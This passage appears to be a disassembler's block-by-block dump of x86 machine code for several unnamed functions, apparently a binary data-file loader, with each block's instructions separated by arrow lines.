0xb0a85f2:	mov	dword ptr [edi], 0
0xb0a85f8:	mov	dword ptr [edi + 4], 0
0xb0a85ff:	jne	0xb0a860c
None
|
|
|
v
0xb0a89f5:	mov	dword ptr [esp], esi
0xb0a89f8:	mov	dword ptr [ebp - 0xbc], edx
0xb0a89fe:	call	0xb070a80
None
|
|
|
v
0xb0a85be:	nop	
None
|
|
|
v
0xb0a81f8:	mov	ecx, dword ptr [edx + eax*4]
0xb0a81fb:	bswap	ecx
0xb0a81fd:	mov	dword ptr [edx + eax*4], ecx
0xb0a8200:	sub	eax, 1
0xb0a8203:	cmp	eax, 0xff
0xb0a8206:	jne	0xb0a81f8
None
|
|
|
v
0xb0a8406:	lea	eax, dword ptr [ebp - 0xac]
0xb0a840c:	mov	dword ptr [ebp - 0xc4], eax
0xb0a8412:	lea	eax, dword ptr [ebp - 0xa8]
0xb0a8418:	mov	dword ptr [ebp - 0xbc], 0
0xb0a8422:	mov	edx, eax
0xb0a8424:	lea	esi, dword ptr [esi]
0xb0a8428:	mov	edi, dword ptr [ebp - 0xc4]
0xb0a842e:	mov	eax, dword ptr [esi + 4]
0xb0a8431:	cmp	eax, dword ptr [esi + 8]
0xb0a8434:	jae	0xb0a89a0
None
|
|
|
v
0xb0a8261:	mov	dword ptr [esp], esi
0xb0a8264:	call	0xb070a80
None
|
|
|
v
0xb0a8362:	mov	ecx, dword ptr [ebp - 0xc0]
0xb0a8368:	mov	edx, dword ptr [ebx + 0x1bc0]
0xb0a836e:	lea	edi, dword ptr [ecx*8]
0xb0a8375:	mov	byte ptr [edx + edi + 4], al
0xb0a8379:	mov	eax, dword ptr [esi + 4]
0xb0a837c:	cmp	eax, dword ptr [esi + 8]
0xb0a837f:	jae	0xb0a89e5
None
|
|
|
v
0xb0a89c2:	cmp	dword ptr [ebp - 0xbc], edi
0xb0a89c8:	jb	0xb0a7f73
None
|
|
|
v
0xb0a8578:	add	edi, 1
0xb0a857b:	cmp	edi, eax
0xb0a857d:	mov	byte ptr [edx + edi*8 - 1], 0
0xb0a8582:	jne	0xb0a8578
None
|
|
|
v
0xb0a8249:	add	edi, 1
0xb0a824c:	cmp	edi, dword ptr [ebp - 0xbc]
0xb0a8252:	mov	byte ptr [edi - 1], al
0xb0a8255:	je	0xb0a8348
None
|
|
|
v
0xb0a81de:	cmp	eax, ecx
0xb0a81e0:	jne	0xb0a81d0
None
|
|
|
v
0xb0a8329:	mov	eax, dword ptr [ebp - 0xb0]
0xb0a832f:	mov	dword ptr [ebx + 0x37b0], 1
0xb0a8339:	mov	dword ptr [esp], eax
0xb0a833c:	call	0xb017470
None
|
|
|
v
0xb0a8645:	mov	edx, dword ptr [ebp - 0xbc]
0xb0a864b:	mov	dword ptr [edi + edx*4], eax
0xb0a864e:	mov	eax, 1
0xb0a8653:	sub	eax, edx
0xb0a8655:	mov	edx, dword ptr [edi + eax*4]
0xb0a8658:	test	edx, edx
0xb0a865a:	je	0xb0a8608
None
|
|
|
v
0xb0a872a:	test	ecx, ecx
0xb0a872c:	je	0xb0a86f8
None
|
|
|
v
0xb0a82c8:	mov	edx, dword ptr [ebp - 0xbc]
0xb0a82ce:	test	eax, eax
0xb0a82d0:	jne	0xb0a7e33
None
|
|
|
v
0xb0a862d:	movzx	eax, byte ptr [eax + 5]
0xb0a8631:	add	eax, dword ptr [ebx + 0x1bbc]
0xb0a8637:	mov	dword ptr [ebp - 0xbc], edx
0xb0a863d:	mov	dword ptr [esp], eax
0xb0a8640:	call	0xb0a70d0
None
|
|
|
v
0xb0a82e0:	test	edi, edi
0xb0a82e2:	lea	esi, dword ptr [ebx - 0x49196]
0xb0a82e8:	jne	0xb0a7efc
None
|
|
|
v
0xb0a84c5:	mov	edx, dword ptr [ebp - 0xdc]
0xb0a84cb:	xor	edi, edi
0xb0a84cd:	test	edx, edx
0xb0a84cf:	je	0xb0a8501
None
|
|
|
v
0xb0a87a1:	test	eax, eax
0xb0a87a3:	jne	0xb0a7f73
None
|
|
|
v
0xb0a89d5:	mov	dword ptr [esp], esi
0xb0a89d8:	call	0xb070a80
None
|
|
|
v
0xb0a838e:	cmp	eax, dword ptr [ebp - 0xc8]
0xb0a8394:	ja	0xb0a7f73
None
|
|
|
v
0xb0a81c0:	lea	eax, dword ptr [ecx + 1]
0xb0a81c3:	add	ecx, dword ptr [ebp - 0xbc]
0xb0a81c9:	jmp	0xb0a81de
None
|
|
|
v
0xb0a808e:	lea	edx, dword ptr [edi + edi*4 + 3]
0xb0a8092:	and	edx, 0xfffffffc
0xb0a8095:	mov	dword ptr [ebp - 0xbc], edx
0xb0a809b:	not	edx
0xb0a809d:	shr	edx, 3
0xb0a80a0:	cmp	edx, eax
0xb0a80a2:	jb	0xb0a7f73
None
|
|
|
v
0xb0a7ea0:	cmp	dl, 0x2f
0xb0a7ea3:	je	0xb0a7ef8
None
|
|
|
v
0xb0a8721:	sub	eax, 1
0xb0a8724:	je	0xb0a88e0
None
|
|
|
v
0xb0a89ed:	lea	esi, dword ptr [esi]
0xb0a89f0:	jmp	0xb0a838e
None
|
|
|
v
0xb0a854d:	test	eax, eax
0xb0a854f:	mov	eax, dword ptr [ebx + 0x1bc0]
0xb0a8555:	setne	byte ptr [eax + edi*8 + 7]
0xb0a855a:	add	edi, 1
0xb0a855d:	cmp	edi, edx
0xb0a855f:	jne	0xb0a8538
None
|
|
|
v
0xb0a8608:	test	esi, esi
0xb0a860a:	je	0xb0a865c
None
|
|
|
v
0xb0a80da:	add	eax, 3
0xb0a80dd:	and	eax, 0xfffffffc
0xb0a80e0:	mov	edx, eax
0xb0a80e2:	not	eax
0xb0a80e4:	shr	eax, 3
0xb0a80e7:	cmp	eax, ecx
0xb0a80e9:	jb	0xb0a7f73
None
|
|
|
v
0xb0a7ec7:	mov	dword ptr [esp + 8], eax
0xb0a7ecb:	lea	eax, dword ptr [ebx - 0x49168]
0xb0a7ed1:	mov	dword ptr [esp + 4], eax
0xb0a7ed5:	lea	eax, dword ptr [ebp - 0xb0]
0xb0a7edb:	mov	dword ptr [esp + 0xc], esi
0xb0a7edf:	mov	dword ptr [esp], eax
0xb0a7ee2:	call	0xb04d4c0
None
|
|
|
v
0xb0a81a1:	test	eax, eax
0xb0a81a3:	je	0xb0a8968
None
|
|
|
v
0xb0a7dfb:	add	ebx, 0x103205
0xb0a7e01:	sub	esp, 0xec
0xb0a7e07:	mov	esi, dword ptr [ebp + 8]
0xb0a7e0a:	mov	dword ptr [ebp - 0xb0], 0
0xb0a7e14:	test	esi, esi
0xb0a7e16:	mov	edi, dword ptr [ebx + 0x37b0]
0xb0a7e1c:	mov	dword ptr [ebx + 0x37b0], 0
0xb0a7e26:	je	0xb0a82e0
None
|
|
|
v
0xb0a7f96:	mov	eax, dword ptr [ebp - 0x78]
0xb0a7f99:	mov	edx, dword ptr [ebp - 0x74]
0xb0a7f9c:	mov	dword ptr [ebx + 0xed4], 0
0xb0a7fa6:	mov	dword ptr [ebx + 0x1be0], eax
0xb0a7fac:	mov	eax, dword ptr [ebp - 0x20]
0xb0a7faf:	mov	dword ptr [ebx + 0x1be4], edx
0xb0a7fb5:	mov	edx, dword ptr [ebp - 0x1c]
0xb0a7fb8:	mov	dword ptr [ebx + 0x1bd8], eax
0xb0a7fbe:	mov	eax, dword ptr [ebp - 0x30]
0xb0a7fc1:	or	dword ptr [esi], 0x8000
0xb0a7fc7:	mov	dword ptr [esp + 0xc], esi
0xb0a7fcb:	mov	dword ptr [ebx + 0x1bd0], eax
0xb0a7fd1:	lea	eax, dword ptr [ebp - 0xa4]
0xb0a7fd7:	mov	dword ptr [esp + 8], 1
0xb0a7fdf:	mov	edi, eax
0xb0a7fe1:	mov	dword ptr [esp + 4], 0x2c
0xb0a7fe9:	mov	dword ptr [esp], eax
0xb0a7fec:	mov	dword ptr [ebx + 0x1bdc], edx
0xb0a7ff2:	mov	dword ptr [ebp - 0xd4], eax
0xb0a7ff8:	call	0xb0696f0
None
|
|
|
v
0xb0a8428:	mov	edi, dword ptr [ebp - 0xc4]
0xb0a842e:	mov	eax, dword ptr [esi + 4]
0xb0a8431:	cmp	eax, dword ptr [esi + 8]
0xb0a8434:	jae	0xb0a89a0
None
|
|
|
v
0xb0a8814:	test	eax, eax
0xb0a8816:	jne	0xb0a7f73
None
|
|
|
v
0xb0a7e3d:	mov	eax, dword ptr [ebx + 0xed4]
0xb0a7e43:	mov	dword ptr [esp], eax
0xb0a7e46:	call	0xb017470
None
|
|
|
v
0xb0a8475:	mov	eax, dword ptr [esi + 4]
0xb0a8478:	cmp	eax, dword ptr [esi + 8]
0xb0a847b:	jae	0xb0a897b
None
|
|
|
v
0xb0a8a25:	lea	eax, dword ptr [ebx - 0x4911a]
0xb0a8a2b:	mov	dword ptr [esp + 0xc], eax
0xb0a8a2f:	lea	eax, dword ptr [ebx - 0x4915d]
0xb0a8a35:	mov	dword ptr [esp + 4], eax
0xb0a8a39:	lea	eax, dword ptr [ebx - 0x49154]
0xb0a8a3f:	mov	dword ptr [esp + 8], 0x1dd
0xb0a8a47:	mov	dword ptr [esp], eax
0xb0a8a4a:	call	0xb027820
None
|
|
|
v
0xb0a89bd:	jmp	0xb0a8443
None
|
|
|
v
0xb0a8280:	lea	eax, dword ptr [ebx - 0x49196]
0xb0a8286:	mov	dword ptr [esp + 8], 0xf
0xb0a828e:	mov	dword ptr [esp + 4], eax
0xb0a8292:	mov	dword ptr [esp], esi
0xb0a8295:	mov	dword ptr [ebp - 0xbc], edx
0xb0a829b:	call	0xb07c620
None
|
|
|
v
0xb0a860c:	mov	eax, dword ptr [ebx + 0x1bc8]
0xb0a8612:	sub	esi, 1
0xb0a8615:	movzx	edx, byte ptr [eax + esi]
0xb0a8619:	mov	eax, dword ptr [ebx + 0x1bc0]
0xb0a861f:	lea	eax, dword ptr [eax + edx*8]
0xb0a8622:	movzx	edx, byte ptr [eax + 4]
0xb0a8626:	mov	ecx, dword ptr [edi + edx*4]
0xb0a8629:	test	ecx, ecx
0xb0a862b:	jne	0xb0a8608
None
|
|
|
v
0xb0a85a0:	mov	dword ptr [ebx + 0x1ba8], 0
0xb0a85aa:	mov	dword ptr [esp], esi
0xb0a85ad:	xor	esi, esi
0xb0a85af:	call	0xb0634f0
None
|
|
|
v
0xb0a867c:	mov	eax, dword ptr [ebx + 0x1bcc]
0xb0a8682:	test	eax, eax
0xb0a8684:	jne	0xb0a86b7
None
|
|
|
v
0xb0a8501:	mov	eax, dword ptr [ebx + 0x1bc4]
0xb0a8507:	mov	edx, dword ptr [ebx + 0x1bc0]
0xb0a850d:	cmp	eax, edi
0xb0a850f:	jbe	0xb0a8524
None
|
|
|
v
0xb0a8111:	add	eax, dword ptr [ebp + 0xc]
0xb0a8114:	mov	dword ptr [esp], eax
0xb0a8117:	call	0xb0173f0
None
|
|
|
v
0xb0a82d6:	jmp	0xb0a7e75
None
|
|
|
v
0xb0a8584:	cmp	byte ptr [ebp - 0xa0], 0
0xb0a858b:	jne	0xb0a875c
None
|
|
|
v
0xb0a82ae:	lea	eax, dword ptr [ebx - 0x4910c]
0xb0a82b4:	mov	dword ptr [esp + 8], 0x13
0xb0a82bc:	mov	dword ptr [esp + 4], eax
0xb0a82c0:	mov	dword ptr [esp], esi
0xb0a82c3:	call	0xb07c620
None
|
|
|
v
0xb0a8946:	cmp	dword ptr [ebx + 0x1bc4], 1
0xb0a894d:	jne	0xb0a8a25
None
|
|
|
v
0xb0a82f5:	lea	eax, dword ptr [ebx - 0x4910c]
0xb0a82fb:	jmp	0xb0a7ec7
None
|
|
|
v
0xb0a8875:	lea	edx, dword ptr [eax + 1]
0xb0a8878:	mov	dword ptr [esi + 4], edx
0xb0a887b:	movzx	eax, byte ptr [eax]
0xb0a887e:	cmp	eax, 0xa
0xb0a8881:	jne	0xb0a7f73
None
|
|
|
v
0xb0a8026:	test	eax, eax
0xb0a8028:	mov	dword ptr [ebp - 0xcc], eax
0xb0a802e:	jne	0xb0a7f73
None
|
|
|
v
0xb0a8544:	lea	ecx, dword ptr [eax + 1]
0xb0a8547:	mov	dword ptr [esi + 4], ecx
0xb0a854a:	movzx	eax, byte ptr [eax]
0xb0a854d:	test	eax, eax
0xb0a854f:	mov	eax, dword ptr [ebx + 0x1bc0]
0xb0a8555:	setne	byte ptr [eax + edi*8 + 7]
0xb0a855a:	add	edi, 1
0xb0a855d:	cmp	edi, edx
0xb0a855f:	jne	0xb0a8538
None
|
|
|
v
0xb0a81e2:	mov	eax, dword ptr [ebp - 0xbc]
0xb0a81e8:	mov	edx, dword ptr [ebx + 0xed4]
0xb0a81ee:	sub	eax, 1
0xb0a81f1:	lea	esi, dword ptr [esi]
0xb0a81f8:	mov	ecx, dword ptr [edx + eax*4]
0xb0a81fb:	bswap	ecx
0xb0a81fd:	mov	dword ptr [edx + eax*4], ecx
0xb0a8200:	sub	eax, 1
0xb0a8203:	cmp	eax, 0xff
0xb0a8206:	jne	0xb0a81f8
None
|
|
|
v
0xb0a8906:	mov	dword ptr [ebx + 0x1bb4], eax
0xb0a890c:	jmp	0xb0a869a
None
|
|
|
v
0xb0a84d1:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0a8591:	mov	eax, dword ptr [ebx + 0x1ba8]
0xb0a8597:	test	eax, eax
0xb0a8599:	je	0xb0a85aa
None
|
|
|
v
0xb0a8269:	cmp	eax, 0xff
0xb0a826c:	je	0xb0a7f73
None
|
|
|
v
0xb0a7e35:	mov	dword ptr [esp], ecx
0xb0a7e38:	call	0xb017470
None
|
|
|
v
0xb0a85dc:	cmp	dword ptr [ebx + 0x1bc4], esi
0xb0a85e2:	ja	0xb0a85c0
None
|
|
|
v
0xb0a8230:	mov	eax, dword ptr [esi + 4]
0xb0a8233:	mov	ecx, dword ptr [esi + 8]
0xb0a8236:	mov	edi, dword ptr [ebp - 0xc4]
0xb0a823c:	cmp	eax, ecx
0xb0a823e:	jae	0xb0a8261
None
|
|
|
v
0xb0a86b7:	mov	ecx, dword ptr [ebx + 0x1bc8]
0xb0a86bd:	xor	edx, edx
0xb0a86bf:	mov	dword ptr [ebx + 0x1bb4], 0
0xb0a86c9:	mov	edi, dword ptr [ebx + 0x1bc0]
0xb0a86cf:	mov	dword ptr [ebx + 0x1bb8], 0
0xb0a86d9:	mov	dword ptr [ebp - 0xc4], 0
0xb0a86e3:	mov	dword ptr [ebp - 0xbc], ecx
0xb0a86e9:	xor	ecx, ecx
0xb0a86eb:	mov	dword ptr [ebp - 0xc0], 0
0xb0a86f5:	jmp	0xb0a872a
None
|
|
|
v
0xb0a7ee7:	mov	esi, dword ptr [ebp - 0xb0]
0xb0a7eed:	mov	ecx, esi
0xb0a7eef:	cmp	eax, 0xff
0xb0a7ef2:	je	0xb0a7e35
None
|
|
|
v
0xb0a81d0:	movzx	edx, byte ptr [eax]
0xb0a81d3:	add	eax, 1
0xb0a81d6:	cmp	edi, edx
0xb0a81d8:	jbe	0xb0a7f73
None
|
|
|
v
0xb0a7e75:	lea	eax, dword ptr [ebx - 0x49172]
0xb0a7e7b:	mov	dword ptr [esp + 4], eax
0xb0a7e7f:	mov	dword ptr [esp], esi
0xb0a7e82:	mov	dword ptr [ebp - 0xbc], edx
0xb0a7e88:	call	0xb07bcc0
None
|
|
|
v
0xb0a85c0:	mov	eax, dword ptr [ebx + 0x1bc0]
0xb0a85c6:	movzx	eax, byte ptr [eax + esi*8 + 5]
0xb0a85cb:	add	esi, 1
0xb0a85ce:	add	eax, dword ptr [ebx + 0x1bbc]
0xb0a85d4:	mov	dword ptr [esp], eax
0xb0a85d7:	call	0xb0a70d0
None
|
|
|
v
0xb0a83c6:	mov	edi, dword ptr [ebp - 0xc8]
0xb0a83cc:	mov	eax, dword ptr [ebx + 0x1bbc]
0xb0a83d2:	mov	dword ptr [esp + 0xc], esi
0xb0a83d6:	mov	dword ptr [esp + 4], 1
0xb0a83de:	mov	dword ptr [esp + 8], edi
0xb0a83e2:	mov	dword ptr [esp], eax
0xb0a83e5:	call	0xb0696f0
None
|
|
|
v
0xb0a80a8:	shl	eax, 3
0xb0a80ab:	mov	edx, eax
0xb0a80ad:	mov	eax, dword ptr [ebp - 0xbc]
0xb0a80b3:	mov	dword ptr [ebp - 0xc0], edx
0xb0a80b9:	add	eax, edx
0xb0a80bb:	mov	edx, eax
0xb0a80bd:	not	edx
0xb0a80bf:	cmp	edx, dword ptr [ebp - 0xc8]
0xb0a80c5:	jb	0xb0a7f73
None
|
|
|
v
0xb0a7e2c:	movzx	edx, byte ptr [esi]
0xb0a7e2f:	test	dl, dl
0xb0a7e31:	jne	0xb0a7e60
None
|
|
|
v
0xb0a848a:	add	edi, 1
0xb0a848d:	cmp	edi, edx
0xb0a848f:	mov	byte ptr [edi - 1], al
0xb0a8492:	jne	0xb0a8475
None
|
|
|
v
0xb0a8341:	jmp	0xb0a7e55
None
|
|
|
v
0xb0a8481:	lea	ecx, dword ptr [eax + 1]
0xb0a8484:	mov	dword ptr [esi + 4], ecx
0xb0a8487:	movzx	eax, byte ptr [eax]
0xb0a848a:	add	edi, 1
0xb0a848d:	cmp	edi, edx
0xb0a848f:	mov	byte ptr [edi - 1], al
0xb0a8492:	jne	0xb0a8475
None
|
|
|
v
0xb0a89ae:	mov	edx, dword ptr [ebp - 0xc0]
0xb0a89b4:	cmp	eax, 0xff
0xb0a89b7:	je	0xb0a7f73
None
|
|
|
v
0xb0a89e5:	mov	dword ptr [esp], esi
0xb0a89e8:	call	0xb070a80
None
|
|
|
v
0xb0a8518:	add	edi, 1
0xb0a851b:	cmp	edi, eax
0xb0a851d:	mov	byte ptr [edx + edi*8 - 2], 0
0xb0a8522:	jne	0xb0a8518
None
|
|
|
v
0xb0a7e4b:	mov	dword ptr [ebx + 0xed4], 0
0xb0a7e55:	lea	esp, dword ptr [ebp - 0xc]
0xb0a7e58:	pop	ebx
0xb0a7e59:	pop	esi
0xb0a7e5a:	pop	edi
0xb0a7e5b:	pop	ebp
0xb0a7e5c:	ret	
None
|
|
|
v
0xb0a816c:	mov	edx, dword ptr [ebp + 0x10]
0xb0a816f:	add	ecx, dword ptr [ebp - 0xe0]
0xb0a8175:	mov	dword ptr [edx], ecx
0xb0a8177:	mov	dword ptr [esp + 0xc], esi
0xb0a817b:	mov	dword ptr [esp + 8], edi
0xb0a817f:	mov	dword ptr [esp + 4], 5
0xb0a8187:	mov	dword ptr [esp], eax
0xb0a818a:	call	0xb0696f0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a8a90
TOTAL BLOCKS :19
0xb0a8a9c:	add	ebx, 0x102564
0xb0a8aa2:	mov	eax, dword ptr [esp + 0x60]
0xb0a8aa6:	mov	dword ptr [esp], eax
0xb0a8aa9:	call	0xb07ae80
None
|
|
|
v
0xb0a8c58:	mov	dword ptr [ebx + 0x37b0], 0
0xb0a8c62:	add	esp, 0x4c
0xb0a8c65:	pop	ebx
0xb0a8c66:	pop	esi
0xb0a8c67:	pop	edi
0xb0a8c68:	pop	ebp
0xb0a8c69:	ret	
None
|
|
|
v
0xb0a8b9e:	mov	edi, dword ptr [esp + 0x1c]
0xb0a8ba2:	mov	ecx, dword ptr [esp + 0x2c]
0xb0a8ba6:	add	dword ptr [edi + eax*4], ecx
0xb0a8ba9:	lea	esi, dword ptr [esi]
0xb0a8bb0:	add	eax, 1
0xb0a8bb3:	movzx	edi, byte ptr [edx + 4]
0xb0a8bb7:	cmp	eax, dword ptr [esp + 0x18]
0xb0a8bbb:	je	0xb0a8bef
None
|
|
|
v
0xb0a8b98:	cmp	byte ptr [edx + 6], 0
0xb0a8b9c:	jne	0xb0a8bd7
None
|
|
|
v
0xb0a8bd3:	test	edi, edi
0xb0a8bd5:	jne	0xb0a8b98
None
|
|
|
v
0xb0a8bef:	mov	eax, dword ptr [esp + 0x68]
0xb0a8bf3:	mov	byte ptr [esi + 5], 0
0xb0a8bf7:	mov	edx, dword ptr [esp + 0x68]
0xb0a8bfb:	mov	byte ptr [esi + 4], 0
0xb0a8bff:	mov	byte ptr [esi + 0xc], 1
0xb0a8c03:	mov	dword ptr [ebx + 0x1bb8], eax
0xb0a8c09:	mov	eax, dword ptr [esp + 0x6c]
0xb0a8c0d:	neg	edx
0xb0a8c0f:	mov	dword ptr [ebx + 0x1bb4], eax
0xb0a8c15:	mov	eax, dword ptr [esp + 0x68]
0xb0a8c19:	mov	dword ptr [esi], eax
0xb0a8c1b:	movzx	eax, byte ptr [esp + 0x20]
0xb0a8c20:	mov	byte ptr [esi + 0xd], al
0xb0a8c23:	mov	eax, dword ptr [esp + 0x6c]
0xb0a8c27:	mov	dword ptr [esi + 8], eax
0xb0a8c2a:	mov	eax, dword ptr [ebx - 0xec]
0xb0a8c30:	mov	esi, dword ptr [esp + 0x60]
0xb0a8c34:	mov	dword ptr [eax], esi
0xb0a8c36:	mov	esi, dword ptr [esp + 0x64]
0xb0a8c3a:	mov	dword ptr [eax + 4], esi
0xb0a8c3d:	mov	eax, dword ptr [ebx - 0xe8]
0xb0a8c43:	mov	dword ptr [eax], edx
0xb0a8c45:	mov	eax, dword ptr [esp + 0x24]
0xb0a8c49:	call	0xb0a7da0
None
|
|
|
v
0xb0a8bd7:	mov	ecx, dword ptr [esp + 0x1c]
0xb0a8bdb:	mov	edi, dword ptr [esp + 0x28]
0xb0a8bdf:	add	dword ptr [ecx + eax*4], edi
0xb0a8be2:	add	eax, 1
0xb0a8be5:	cmp	eax, dword ptr [esp + 0x18]
0xb0a8be9:	movzx	edi, byte ptr [edx + 4]
0xb0a8bed:	jne	0xb0a8bbd
None
|
|
|
v
0xb0a8bbd:	movzx	edx, byte ptr [ebp + eax]
0xb0a8bc2:	lea	edx, dword ptr [esi + edx*8]
0xb0a8bc5:	movzx	ecx, byte ptr [edx + 4]
0xb0a8bc9:	mov	byte ptr [ebp + eax], cl
0xb0a8bcd:	cmp	byte ptr [edx + 7], 0
0xb0a8bd1:	jne	0xb0a8bb0
None
|
|
|
v
0xb0a8aea:	mov	eax, dword ptr [ebx + 0x37b0]
0xb0a8af0:	test	eax, eax
0xb0a8af2:	je	0xb0a8c4e
None
|
|
|
v
0xb0a8af8:	cmp	dword ptr [ebx + 0x1bc4], 1
0xb0a8aff:	jbe	0xb0a8c58
None
|
|
|
v
0xb0a8b61:	mov	eax, dword ptr [esp + 0x6c]
0xb0a8b65:	xor	edi, edi
0xb0a8b67:	sub	eax, dword ptr [ebx + 0x1bb4]
0xb0a8b6d:	mov	ebp, dword ptr [ebx + 0xed4]
0xb0a8b73:	mov	ecx, dword ptr [ebx + 0x1bc8]
0xb0a8b79:	mov	dword ptr [esp + 0x2c], eax
0xb0a8b7d:	mov	eax, dword ptr [esp + 0x68]
0xb0a8b81:	sub	eax, dword ptr [ebx + 0x1bb8]
0xb0a8b87:	mov	dword ptr [esp + 0x1c], ebp
0xb0a8b8b:	mov	ebp, ecx
0xb0a8b8d:	mov	dword ptr [esp + 0x28], eax
0xb0a8b91:	xor	eax, eax
0xb0a8b93:	jmp	0xb0a8bbd
None
|
|
|
v
0xb0a8aae:	add	eax, 1
0xb0a8ab1:	mov	edi, eax
0xb0a8ab3:	mov	dword ptr [esp + 0x20], eax
0xb0a8ab7:	mov	eax, dword ptr [esp + 0x64]
0xb0a8abb:	mov	dword ptr [esp], eax
0xb0a8abe:	call	0xb07ae80
None
|
|
|
v
0xb0a8b35:	mov	eax, dword ptr [esp + 0x3c]
0xb0a8b39:	mov	dword ptr [ebx + 0x1bc4], 2
0xb0a8b43:	mov	esi, dword ptr [ebx + 0x1bc0]
0xb0a8b49:	mov	dword ptr [ebx + 0x1bbc], eax
0xb0a8b4f:	mov	eax, dword ptr [ebx + 0x1bcc]
0xb0a8b55:	test	eax, eax
0xb0a8b57:	mov	dword ptr [esp + 0x18], eax
0xb0a8b5b:	je	0xb0a8bef
None
|
|
|
v
0xb0a8ac3:	lea	esi, dword ptr [eax + 1]
0xb0a8ac6:	mov	eax, edi
0xb0a8ac8:	add	eax, esi
0xb0a8aca:	mov	ecx, eax
0xb0a8acc:	mov	dword ptr [esp + 0x24], eax
0xb0a8ad0:	lea	eax, dword ptr [esp + 0x3c]
0xb0a8ad4:	mov	dword ptr [esp + 8], eax
0xb0a8ad8:	lea	eax, dword ptr [ebx - 0x49145]
0xb0a8ade:	mov	dword ptr [esp], eax
0xb0a8ae1:	mov	dword ptr [esp + 4], ecx
0xb0a8ae5:	call	0xb0a7df0
None
|
|
|
v
0xb0a8b05:	mov	eax, dword ptr [esp + 0x20]
0xb0a8b09:	mov	dword ptr [esp + 8], eax
0xb0a8b0d:	mov	eax, dword ptr [esp + 0x60]
0xb0a8b11:	mov	dword ptr [esp + 4], eax
0xb0a8b15:	mov	eax, dword ptr [esp + 0x3c]
0xb0a8b19:	mov	dword ptr [esp], eax
0xb0a8b1c:	call	0xb07cad0
None
|
|
|
v
0xb0a8bb0:	add	eax, 1
0xb0a8bb3:	movzx	edi, byte ptr [edx + 4]
0xb0a8bb7:	cmp	eax, dword ptr [esp + 0x18]
0xb0a8bbb:	je	0xb0a8bef
None
|
|
|
v
0xb0a8c4e:	add	esp, 0x4c
0xb0a8c51:	pop	ebx
0xb0a8c52:	pop	esi
0xb0a8c53:	pop	edi
0xb0a8c54:	pop	ebp
0xb0a8c55:	ret	
None
|
|
|
v
0xb0a8b21:	mov	dword ptr [esp + 8], esi
0xb0a8b25:	mov	esi, dword ptr [esp + 0x64]
0xb0a8b29:	mov	dword ptr [esp + 4], esi
0xb0a8b2d:	mov	dword ptr [esp], eax
0xb0a8b30:	call	0xb07d0b0
None
|
|
|
v
0xb0a8a90:	push	ebp
0xb0a8a91:	push	edi
0xb0a8a92:	push	esi
0xb0a8a93:	push	ebx
0xb0a8a94:	sub	esp, 0x4c
0xb0a8a97:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a8c70
TOTAL BLOCKS :105
0xb0a8ef8:	sub	esi, 1
0xb0a8efb:	cmp	ecx, dword ptr [eax + esi*4 - 4]
0xb0a8eff:	jl	0xb0a8ef8
None
|
|
|
v
0xb0a8e65:	mov	eax, dword ptr [esp + 0x48]
0xb0a8e69:	mov	esi, dword ptr [esp + 0x40]
0xb0a8e6d:	mov	dword ptr [eax], 0
0xb0a8e73:	mov	eax, dword ptr [esp + 0x4c]
0xb0a8e77:	mov	dword ptr [eax], 0
0xb0a8e7d:	lea	eax, dword ptr [edi + edx*8 - 8]
0xb0a8e81:	jmp	0xb0a8e94
None
|
|
|
v
0xb0a90f5:	mov	ecx, dword ptr [ebx + 0x1bc4]
0xb0a90fb:	mov	edx, dword ptr [ebx + 0x1bc0]
0xb0a9101:	test	ecx, ecx
0xb0a9103:	je	0xb0a91ef
None
|
|
|
v
0xb0a8fe6:	sub	ecx, 1
0xb0a8fe9:	mov	ebp, edx
0xb0a8feb:	jne	0xb0a8fc8
None
|
|
|
v
0xb0a9131:	lea	ecx, dword ptr [edx + edi*8]
0xb0a9134:	cmp	byte ptr [ecx + 4], 0
0xb0a9138:	je	0xb0a91b2
None
|
|
|
v
0xb0a9082:	mov	edx, dword ptr [esp + 0x50]
0xb0a9086:	mov	ecx, 1
0xb0a908b:	mov	eax, dword ptr [esp + 0x40]
0xb0a908f:	call	0xb0a7aa0
None
|
|
|
v
0xb0a8c80:	add	ebx, 0x102380
0xb0a8c86:	test	esi, esi
0xb0a8c88:	je	0xb0a8e59
None
|
|
|
v
0xb0a8dd0:	mov	eax, dword ptr [ebp]
0xb0a8dd3:	test	eax, eax
0xb0a8dd5:	je	0xb0a9273
None
|
|
|
v
0xb0a8fa5:	mov	ebp, dword ptr [ebp]
0xb0a8fa8:	add	ebp, 1
0xb0a8fab:	cmp	ebp, esi
0xb0a8fad:	jne	0xb0a8e9b
None
|
|
|
v
0xb0a907a:	test	eax, eax
0xb0a907c:	je	0xb0a92a8
None
|
|
|
v
0xb0a8cd6:	sub	eax, ecx
0xb0a8cd8:	mov	edx, 0x881a22ef
0xb0a8cdd:	mov	dword ptr [esp + 0x14], eax
0xb0a8ce1:	imul	edx
0xb0a8ce3:	mov	eax, dword ptr [esp + 0x14]
0xb0a8ce7:	lea	esi, dword ptr [edi - 1]
0xb0a8cea:	add	eax, edx
0xb0a8cec:	mov	edx, dword ptr [esp + 0x14]
0xb0a8cf0:	sar	eax, 0x17
0xb0a8cf3:	sar	edx, 0x1f
0xb0a8cf6:	sub	eax, edx
0xb0a8cf8:	cmp	edi, eax
0xb0a8cfa:	ja	0xb0a8ea8
None
|
|
|
v
0xb0a8f69:	mov	esi, eax
0xb0a8f6b:	mov	eax, dword ptr [esp + 0x18]
0xb0a8f6f:	nop	
0xb0a8f70:	add	esi, 1
0xb0a8f73:	cmp	ecx, dword ptr [eax + esi*4]
0xb0a8f76:	jge	0xb0a8f70
None
|
|
|
v
0xb0a8e41:	test	eax, eax
0xb0a8e43:	jne	0xb0a915e
None
|
|
|
v
0xb0a91bd:	movzx	eax, byte ptr [edx + ecx + 5]
0xb0a91c2:	add	eax, dword ptr [ebx + 0x1bbc]
0xb0a91c8:	mov	dword ptr [esp + 0x14], ecx
0xb0a91cc:	mov	dword ptr [esp], eax
0xb0a91cf:	call	0xb0a70d0
None
|
|
|
v
0xb0a9056:	mov	dword ptr [esp], eax
0xb0a9059:	call	0xb0a7180
None
|
|
|
v
0xb0a922b:	mov	edi, dword ptr [esp + 0x18]
0xb0a922f:	cmp	dword ptr [esp + 0x14], edi
0xb0a9233:	jae	0xb0a8de6
None
|
|
|
v
0xb0a8ff8:	mov	eax, dword ptr [ebp]
0xb0a8ffb:	mov	dword ptr [ebp + 4], eax
0xb0a8ffe:	jmp	0xb0a8e1c
None
